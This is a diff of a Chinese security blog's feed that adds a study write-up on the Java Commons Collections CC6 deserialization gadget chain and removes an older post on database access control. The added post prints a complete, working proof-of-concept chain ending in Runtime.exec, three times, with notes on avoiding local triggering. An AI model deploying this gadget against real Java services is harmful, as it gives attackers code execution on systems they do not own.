@@ -10,14 +10,218 @@
         </author>
         <description>一个妄想全栈web小废物</description>
         <language>zh-CN</language>
-        <pubDate>Tue, 16 May 2023 00:00:00 +0800</pubDate>
-        <lastBuildDate>Tue, 16 May 2023 00:00:00 +0800</lastBuildDate>
+        <pubDate>Wed, 24 May 2023 00:00:00 +0800</pubDate>
+        <lastBuildDate>Wed, 24 May 2023 00:00:00 +0800</lastBuildDate>
         <category term="Clown" />
         <category term="Web" />
         <category term="Pwn" />
         <category term="CTF" />
         <category term="AWD" />
         <category term="ACM" />
+        <item>
+            <guid isPermalink="true">https://blog.xcu.icu/2023/05/24/CommonsCollections-6/</guid>
+            <title>ConmonsCollection-6</title>
+            <link>https://blog.xcu.icu/2023/05/24/CommonsCollections-6/</link>
+            <category term="java安全" scheme="https://blog.xcu.icu/categories/java%E5%AE%89%E5%85%A8/" />
+            <category term="CC6" scheme="https://blog.xcu.icu/tags/CC6/" />
+            <pubDate>Wed, 24 May 2023 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;h2 id=&#34;前言&#34;&gt;&lt;a href=&#34;#前言&#34; class=&#34;headerlink&#34; title=&#34;前言&#34;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;也是跟着p牛的文章跟了一遍CommonsCollection1这条链子，在CC1中有着诸多限制，版本也是很低，当下JDK20在今年的3月份21正式发布，预计在本年9月将发布JDK21，版本迭代的速度非常之快，原始的cc链只能在jdk8u6*之前能够利用显然是不够的，也是需要想办法在更高版本能够利用cc链来进行恶意攻击&lt;/p&gt;
+&lt;h2 id=&#34;CommonsCollection-6&#34;&gt;&lt;a href=&#34;#CommonsCollection-6&#34; class=&#34;headerlink&#34; title=&#34;CommonsCollection-6&#34;&gt;&lt;/a&gt;CommonsCollection-6&lt;/h2&gt;&lt;p&gt;文章中所涉及的代码都在github项目&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2Nsb3duLXEvQ2xvd25famF2YSVFNCVCOCVBRCVFRiVCQyU4QyVFOCU5MCU4QyVFNiU5NiVCMCVFNiVCNSU4NSVFOCVBRSVCMCVFRiVCQyU4QyVFNSVBNCVBNyVFNCVCRCVBQyVFOCVCRCVCQiVFNSU5NiVCNw==&#34;&gt;https://github.com/clown-q/Clown_java中，萌新浅记，大佬轻喷&lt;/span&gt;&lt;/p&gt;
+&lt;h3 id=&#34;dump源码&#34;&gt;&lt;a href=&#34;#dump源码&#34; class=&#34;headerlink&#34; title=&#34;dump源码&#34;&gt;&lt;/a&gt;dump源码&lt;/h3&gt;&lt;p&gt;这里插入一点调试前的工作，因为jdk中是反编译的class文件，对调试很不友好，这里我是使用的openjdk的sun添加到外部库&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9oZy5vcGVuamRrLm9yZy9qZGs4dS9qZGs4dS9qZGsvcmV2LzgxODFmOGI2ZWYwZA==&#34;&gt;jdk8u&amp;#x2F;jdk8u&amp;#x2F;jdk: 8181f8b6ef0d (openjdk.org)&lt;/span&gt;将文件down下来后&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305181708443.png&#34; alt=&#34;image-20230518170826389&#34;&gt;&lt;/p&gt;
+&lt;p&gt;将这里的sun文件放到jdk的src目录下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305181709243.png&#34; alt=&#34;image-20230518170904208&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后在idea中添加一下路径&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305181711239.png&#34; alt=&#34;image-20230518171131186&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;链子调整&#34;&gt;&lt;a href=&#34;#链子调整&#34; class=&#34;headerlink&#34; title=&#34;链子调整&#34;&gt;&lt;/a&gt;链子调整&lt;/h3&gt;&lt;p&gt;欧德克回归正题，因为在高版本中sun.reflect.annotation.AnnotationInvocationHandler 的readObject方法逻辑发生了变化&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305181658731.png&#34; alt=&#34;image-20230518165822615&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里没有了我们所需要的chaeck的调用，这里就需要寻找的新的利用链，也就是这个cc6来解决高版本中无法利用，简单来说实际上就是在找上下⽂中是否还有其他调⽤ LazyMap#get() 的地⽅,后面的地方还是和cc1一样的方式调用到危险函数，其实是用到了HashMap，所以大概CC6&amp;#x3D;CC1+URLDNS？&lt;/p&gt;
+&lt;p&gt;这里找到的是 &lt;code&gt;org.apache.commons.collections.keyvalue.TiedMapEntry&lt;/code&gt;这个类&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305181812569.png&#34; alt=&#34;image-20230518181242510&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里使用了get方法，这个map可控，⽽hashCode⽅法调⽤了getValue⽅法&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;mermaid&#34;&gt;graph LR
+a(HashMap.readObject)--&amp;gt;b(TiredMapEntry.hashCode)
+b(TiredMapEntry.hashCode)--&amp;gt;c(LazyMap.get)
+c(LazyMap.get)--&amp;gt;d(ChainedTransformer.transform)
+d(ChainedTransformer.transform)--&amp;gt;e(Runtime.exec)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;java&#34;&gt;package CommonsCollection.Clown_CC6;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+
+public class POC1 &amp;#123;
+    public static void Serialization(Object object) throws Exception&amp;#123;
+        FileOutputStream fileOutputStream = new FileOutputStream(&amp;quot;poc1.txt&amp;quot;);
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
+        objectOutputStream.writeObject(object);
+        System.out.println(&amp;quot;output serialization&amp;quot;);
+    &amp;#125;
+    public static void Unserialization() throws Exception&amp;#123;
+        FileInputStream fileInputStream = new FileInputStream(&amp;quot;poc1.txt&amp;quot;);
+        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
+        objectInputStream.readObject();
+        System.out.println(&amp;quot;input unserialization&amp;quot;);
+    &amp;#125;
+
+    public static void main(String[] args) throws Exception&amp;#123;
+        Transformer[] transformers = new Transformer[]&amp;#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&amp;quot;getMethod&amp;quot;,new Class[]&amp;#123;String.class, Class[].class&amp;#125;,new Object[] &amp;#123; &amp;quot;getRuntime&amp;quot;, new Class[0] &amp;#125;),
+                new InvokerTransformer(&amp;quot;invoke&amp;quot;, new Class[] &amp;#123; Object.class, Object[].class &amp;#125;, new Object[] &amp;#123; null, new Object[0] &amp;#125;),
+                new InvokerTransformer(&amp;quot;exec&amp;quot;, new Class[] &amp;#123; String.class &amp;#125;, new String[] &amp;#123;&amp;quot;calc&amp;quot; &amp;#125;),
+        &amp;#125;;
+        Transformer chainedTransformer = new ChainedTransformer(transformers);
+
+        HashMap map = new HashMap();
+        Map lazymap = LazyMap.decorate(map,new ConstantTransformer(1));//这里先设置为一个没有用的，下面通过反射设置成目标为了避免在本地本地调试时触发命令执⾏
+
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,&amp;quot;aaa&amp;quot;);
+
+        HashMap&amp;lt;Object, Object&amp;gt; map2 = new HashMap&amp;lt;&amp;gt;();//这里是触发点
+        map2.put(tiedMapEntry,&amp;quot;bbb&amp;quot;);
+        lazymap.remove(&amp;quot;aaa&amp;quot;);//这里将序列化过程中存入的key删除
+
+        Class clazz = LazyMap.class;//这里通过反射将LazyMap设置为目标值
+        Field factoryField = clazz.getDeclaredField(&amp;quot;factory&amp;quot;);
+        factoryField.setAccessible(true);//私有属性
+        factoryField.set(lazymap,chainedTransformer);//这里设置为目标的危险函数
+
+        //Serialization(map2);
+        Unserialization();
+    &amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;注意&#34;&gt;&lt;a href=&#34;#注意&#34; class=&#34;headerlink&#34; title=&#34;注意&#34;&gt;&lt;/a&gt;注意&lt;/h3&gt;&lt;p&gt;上面是完整的poc，下面来记录一下这个链子的两个注意的点&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;java&#34;&gt;package CommonsCollection.Clown_CC6;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+
+public class POC1 &amp;#123;
+    public static void Serialization(Object object) throws Exception&amp;#123;
+        FileOutputStream fileOutputStream = new FileOutputStream(&amp;quot;poc1.txt&amp;quot;);
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
+        objectOutputStream.writeObject(object);
+        System.out.println(&amp;quot;output serialization&amp;quot;);
+    &amp;#125;
+    public static void Unserialization() throws Exception&amp;#123;
+        FileInputStream fileInputStream = new FileInputStream(&amp;quot;poc1.txt&amp;quot;);
+        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
+        objectInputStream.readObject();
+        System.out.println(&amp;quot;input unserialization&amp;quot;);
+    &amp;#125;
+
+    public static void main(String[] args) throws Exception&amp;#123;
+        Transformer[] transformers = new Transformer[]&amp;#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&amp;quot;getMethod&amp;quot;,new Class[]&amp;#123;String.class, Class[].class&amp;#125;,new Object[] &amp;#123; &amp;quot;getRuntime&amp;quot;, new Class[0] &amp;#125;),
+                new InvokerTransformer(&amp;quot;invoke&amp;quot;, new Class[] &amp;#123; Object.class, Object[].class &amp;#125;, new Object[] &amp;#123; null, new Object[0] &amp;#125;),
+                new InvokerTransformer(&amp;quot;exec&amp;quot;, new Class[] &amp;#123; String.class &amp;#125;, new String[] &amp;#123;&amp;quot;calc&amp;quot; &amp;#125;),
+        &amp;#125;;
+        Transformer chainedTransformer = new ChainedTransformer(transformers);
+
+        HashMap map = new HashMap();
+//        Map lazymap = LazyMap.decorate(map,new ConstantTransformer(1));//这里先设置为一个没有用的，下面通过反射设置成目标为了避免在本地本地调试时触发命令执⾏
+        Map lazymap = LazyMap.decorate(map,chainedTransformer);
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,&amp;quot;aaa&amp;quot;);
+
+        HashMap&amp;lt;Object, Object&amp;gt; map2 = new HashMap&amp;lt;&amp;gt;();//这里是触发点
+        map2.put(tiedMapEntry,&amp;quot;bbb&amp;quot;);
+//        lazymap.remove(&amp;quot;aaa&amp;quot;);//这里将序列化过程中存入的key删除
+
+//        Class clazz = LazyMap.class;//这里通过反射将LazyMap设置为目标值
+//        Field factoryField = clazz.getDeclaredField(&amp;quot;factory&amp;quot;);
+//        factoryField.setAccessible(true);//私有属性
+//        factoryField.set(lazymap,chainedTransformer);//这里设置为目标的危险函数
+
+        Serialization(map2);
+//        Unserialization();
+    &amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;首先是这里在序列化的时候就已经触发了命令执行，这里跟URLDNS的思想一样，在序列化的阶段的put触发，这里其实不改也能用，但是会再本地就进行过命令执行，会有干扰，那么最简单的思想就是在put前将链子中断，put之后再将链子指向改为正确的&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;java&#34;&gt;package CommonsCollection.Clown_CC6;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.HashMap;
+import java.util.Map;
+
+public class POC1 &amp;#123;
+    public static void Serialization(Object object) throws Exception&amp;#123;
+        FileOutputStream fileOutputStream = new FileOutputStream(&amp;quot;poc1.txt&amp;quot;);
+        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
+        objectOutputStream.writeObject(object);
+        System.out.println(&amp;quot;output serialization&amp;quot;);
+    &amp;#125;
+    public static void Unserialization() throws Exception&amp;#123;
+        FileInputStream fileInputStream = new FileInputStream(&amp;quot;poc1.txt&amp;quot;);
+        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
+        objectInputStream.readObject();
+        System.out.println(&amp;quot;input unserialization&amp;quot;);
+    &amp;#125;
+
+    public static void main(String[] args) throws Exception&amp;#123;
+        Transformer[] transformers = new Transformer[]&amp;#123;
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&amp;quot;getMethod&amp;quot;,new Class[]&amp;#123;String.class, Class[].class&amp;#125;,new Object[] &amp;#123; &amp;quot;getRuntime&amp;quot;, new Class[0] &amp;#125;),
+                new InvokerTransformer(&amp;quot;invoke&amp;quot;, new Class[] &amp;#123; Object.class, Object[].class &amp;#125;, new Object[] &amp;#123; null, new Object[0] &amp;#125;),
+                new InvokerTransformer(&amp;quot;exec&amp;quot;, new Class[] &amp;#123; String.class &amp;#125;, new String[] &amp;#123;&amp;quot;calc&amp;quot; &amp;#125;),
+        &amp;#125;;
+        Transformer chainedTransformer = new ChainedTransformer(transformers);
+
+        HashMap map = new HashMap();
+        Map lazymap = LazyMap.decorate(map,new ConstantTransformer(1));//这里先设置为一个没有用的，下面通过反射设置成目标为了避免在本地本地调试时触发命令执⾏
+//        Map lazymap = LazyMap.decorate(map,chainedTransformer);
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,&amp;quot;aaa&amp;quot;);
+
+        HashMap&amp;lt;Object, Object&amp;gt; map2 = new HashMap&amp;lt;&amp;gt;();//这里是触发点
+        map2.put(tiedMapEntry,&amp;quot;bbb&amp;quot;);
+//        lazymap.remove(&amp;quot;aaa&amp;quot;);//这里将序列化过程中存入的key删除
+
+        Class clazz = LazyMap.class;//这里通过反射将LazyMap设置为目标值
+        Field factoryField = clazz.getDeclaredField(&amp;quot;factory&amp;quot;);
+        factoryField.setAccessible(true);//私有属性
+        factoryField.set(lazymap,chainedTransformer);//这里设置为目标的危险函数
+
+        Serialization(map2);
+//        Unserialization();
+    &amp;#125;
+&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里是为什么要有lazymap.remove(“aaa”);，如果没有的话反序列化不能正常触发链子，这里在put下断点调试进去看一下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305181944904.png&#34; alt=&#34;image-20230518194433825&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里进到hash，一直进到get方法&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202305181945986.png&#34; alt=&#34;image-20230518194538929&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到这里会判断LazyMap里面有没有key，开始是没有的,然后回put进去一个键值对，所以如果这里不删除就会导致在反序列化的之后不能进到if，不能调用factory.Transform函数&lt;/p&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">https://blog.xcu.icu/2023/05/16/CommonsCollections-1/</guid>
             <title>ConmonsCollection-1</title>
@@ -7421,234 +7625,6 @@ systeminfo
 );
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;修改需要使用 ALTER TABLE 语句修改表中的完整性限制，修改时需要先删除原来的约束条件，再增加新的约束条件&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">https://blog.xcu.icu/2022/12/06/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7/</guid>
-            <title>数据库安全性</title>
-            <link>https://blog.xcu.icu/2022/12/06/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7/</link>
-            <category term="数据库" scheme="https://blog.xcu.icu/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/" />
-            <category term="数据库" scheme="https://blog.xcu.icu/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" />
-            <pubDate>Tue, 06 Dec 2022 00:00:00 +0800</pubDate>
-            <description><![CDATA[ &lt;h2 id=&#34;前言&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前言&#34;&gt;#&lt;/a&gt; 前言&lt;/h2&gt;
-&lt;p&gt;本篇记录学习数据库系统概论的第四章 -- 数据库安全性&lt;/p&gt;
-&lt;h2 id=&#34;数据库安全性概述&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库安全性概述&#34;&gt;#&lt;/a&gt; 数据库安全性概述&lt;/h2&gt;
-&lt;p&gt;数据库的安全性是指保护数据库中的数据，以防止不合法的使用导致数据库中数据的泄露，更改和破坏&lt;/p&gt;
-&lt;h3 id=&#34;数据库的不安全因素&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库的不安全因素&#34;&gt;#&lt;/a&gt; 数据库的不安全因素&lt;/h3&gt;
-&lt;ol&gt;
-&lt;li&gt;非授权用户对数据库的恶意存取和破坏&lt;/li&gt;
-&lt;li&gt;数据库中安全或敏感的数据被泄露&lt;/li&gt;
-&lt;li&gt;安全环境的脆弱性&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3 id=&#34;安全标准&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安全标准&#34;&gt;#&lt;/a&gt; 安全标准&lt;/h3&gt;
-&lt;p&gt;桔皮书（TCSEC）和 CC 标准，是最具有影响力的两大准则，当下 CC 已经基本取代了 TCSEC 成为评估信息产品安全性的主要标准&lt;/p&gt;
-&lt;h4 id=&#34;tcsec标准&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tcsec标准&#34;&gt;#&lt;/a&gt; TCSEC 标准&lt;/h4&gt;
-&lt;p&gt;从四个方面来描述安全性级别划分的指标，即 &lt;code&gt;安全策略&lt;/code&gt; ， &lt;code&gt;责任&lt;/code&gt; ， &lt;code&gt;保证&lt;/code&gt; 和 &lt;code&gt;文档&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;下图是发展史&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221206141149070.png&#34; alt=&#34;image-20221206141149070&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;从这四个方面又划分出如下 7 个等级&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221206141110402.png&#34; alt=&#34;image-20221206141110402&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;安全级别从上往下越来越低，D 级包含了所有不符合更高标准的系统&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;C1，能够实现用户和数据的分离，进行自主存取控制（DAC）&lt;/li&gt;
-&lt;li&gt;C2，安全产品的最低档，提供受控的存取保护&lt;/li&gt;
-&lt;li&gt;B1，对标记的主体和课题实施强制存取控制（MAC）以及审计等安全机制，被认为是真正意义上的安全产品&lt;/li&gt;
-&lt;li&gt;B2 结构化保护&lt;/li&gt;
-&lt;li&gt;B3，安全域&lt;/li&gt;
-&lt;li&gt;A1，验证设计&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h4 id=&#34;cc标准&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cc标准&#34;&gt;#&lt;/a&gt; CC 标准&lt;/h4&gt;
-&lt;p&gt;国际公认的表述信息技术安全性的结构，主要由三个部分组成&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;简介和一般模型&lt;/li&gt;
-&lt;li&gt;安全功能要求&lt;/li&gt;
-&lt;li&gt;安全保证要求&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;他的安全级别也是划分为 7 个等级分别对应 TCSEC 安全级别&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221206143134148.png&#34; alt=&#34;image-20221206143134148&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;数据库安全性控制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库安全性控制&#34;&gt;#&lt;/a&gt; 数据库安全性控制&lt;/h2&gt;
-&lt;p&gt;上面所记录仅做了解，接下来是本篇的重心部分&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;再计算机系统中，安全措施是一级一级层层设置的&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221206165609085.png&#34; alt=&#34;image-20221206165609085&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这样如上图的一个验证过程&lt;/p&gt;
-&lt;p&gt;数据库安全控制的常用方法&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;用户身份鉴定&lt;/li&gt;
-&lt;li&gt;存取控制&lt;/li&gt;
-&lt;li&gt;视图&lt;/li&gt;
-&lt;li&gt;审计&lt;/li&gt;
-&lt;li&gt;数据加密&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;用户的身份鉴定&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#用户的身份鉴定&#34;&gt;#&lt;/a&gt; 用户的身份鉴定&lt;/h3&gt;
-&lt;p&gt;用户标识通常由用户名和用户标识号两部分组成&lt;/p&gt;
-&lt;p&gt;常用的身份鉴别方法&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;静态口令鉴别：常用，简单但是安全性低&lt;/li&gt;
-&lt;li&gt;动态口令鉴别：比较安全&lt;/li&gt;
-&lt;li&gt;生物特征鉴别：较高的安全性&lt;/li&gt;
-&lt;/ol&gt;
-&lt;h3 id=&#34;存取控制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#存取控制&#34;&gt;#&lt;/a&gt; 存取控制&lt;/h3&gt;
-&lt;p&gt;数据库安全性最重要的一点就是确保只有授权的用户能访问数据库&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;存取控制的机制&lt;/code&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;用户定义权限&lt;/li&gt;
-&lt;li&gt;合法权限检查&lt;/li&gt;
-&lt;li&gt;二者共同组成了 DBMS 的存取控制子系统&lt;/li&gt;
-&lt;/ul&gt;
-&lt;h3 id=&#34;自主存取控制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#自主存取控制&#34;&gt;#&lt;/a&gt; 自主存取控制&lt;/h3&gt;
-&lt;p&gt;通过 SQL 语言的 &lt;code&gt;GRANT&lt;/code&gt; （授予）和 &lt;code&gt;REVOKE&lt;/code&gt; （收回）语句实现，用户的权限组成：数据库对象，操作类型&lt;/p&gt;
-&lt;p&gt;定于用权限，定于用户可以在哪些表上面可以进行哪些操作，下表是关系数据库中的存储权限&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221206174324541.png&#34; alt=&#34;image-20221206174324541&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;授权和权限回收&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#授权和权限回收&#34;&gt;#&lt;/a&gt; 授权和权限回收&lt;/h3&gt;
-&lt;h4 id=&#34;授权&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#授权&#34;&gt;#&lt;/a&gt; 授权&lt;/h4&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;GRANT &amp;lt;权限&amp;gt;[,&amp;lt;权限&amp;gt;]... ON &amp;lt;对象类型&amp;gt; &amp;lt;对象名&amp;gt;[,&amp;lt;对象类型&amp;gt;&amp;lt;对象名&amp;gt;]... TO &amp;lt;用户&amp;gt;[,&amp;lt;用户&amp;gt;]... [WITH GRANT OPTION];/*又最后一句话的时候证明权限是可以授予给他人的*/
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;code&gt;把查询Student的权限授予给用户U1&lt;/code&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;grant select ON Student to U1;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;code&gt;把对Student和Course的全部权限授予U2，U3&lt;/code&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;grant All privileges ON Student,Course to U2,U3;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;code&gt;把对SC表的查询权限授予所有用户&lt;/code&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;grant select on SC to public;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;code&gt;把查询Student表和修改Sno的权限授予U4&lt;/code&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;grant select,update(Sno) on Student to U4;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;code&gt;对SC表的INSERT权限授予U5，且可再次授权&lt;/code&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;grant insert on SC to U5 with grant option;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;h4 id=&#34;权限收回&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#权限收回&#34;&gt;#&lt;/a&gt; 权限收回&lt;/h4&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;REVOKE &amp;lt;权限&amp;gt;[,&amp;lt;权限&amp;gt;]... ON &amp;lt;对象类型&amp;gt;&amp;lt;对象名&amp;gt;[,&amp;lt;对象类型&amp;gt;&amp;lt;对象名&amp;gt;]... FROM &amp;lt;用户&amp;gt;[,&amp;lt;用户&amp;gt;]...;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;code&gt;把用户U4修改学号的权限收回&lt;/code&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;revoke update(Sno) ON Student from U4;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;code&gt;收回所有用户对表SC的查询权限&lt;/code&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;revoke select ON SC from public;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&lt;code&gt;把用户U5对SC表的Insert权限收回&lt;/code&gt;&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;revoke insert on SC from U5 cascade;#cascade级联操作，收回U5授予出去的权限
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;&amp;lt;font color=red&amp;gt; 用户可以自主决定将数据的存取权限授予任何人，决定是否也将授权的权限搜娱给别人，这样的存取控制称为用户自主存取控制 &amp;lt;/font&amp;gt;&lt;/p&gt;
-&lt;h3 id=&#34;数据库角色&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据库角色&#34;&gt;#&lt;/a&gt; 数据库角色&lt;/h3&gt;
-&lt;p&gt;数据库角色是数据库权限的集合，为了简化授权过程，为一组具有相同权限的用户创建一个角色&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;角色的创建&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;CREATE ROLE &amp;lt;角色名&amp;gt;;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;给角色授权&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;GRANT &amp;lt;权限&amp;gt;[,&amp;lt;权限&amp;gt;]... ON 对象名 TO &amp;lt;角色&amp;gt;[,&amp;lt;角色&amp;gt;]...;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;将一个角色授予其他的角色或用户&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;GRANT &amp;lt;角色1&amp;gt;[,&amp;lt;角色2&amp;gt;]... TO &amp;lt;角色2&amp;gt;[,&amp;lt;用户1&amp;gt;]... [WITH ADMIN OPTION];
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;角色权限的收回&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;REVOKE &amp;lt;权限&amp;gt;[,&amp;lt;权限&amp;gt;]... ON &amp;lt;对象类型&amp;gt;&amp;lt;对象名&amp;gt; FROM &amp;lt;角色&amp;gt;[,&amp;lt;角色&amp;gt;]...;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;&lt;code&gt;通过角色来实现将一组权限搜娱一个用户&lt;/code&gt;&lt;/p&gt;
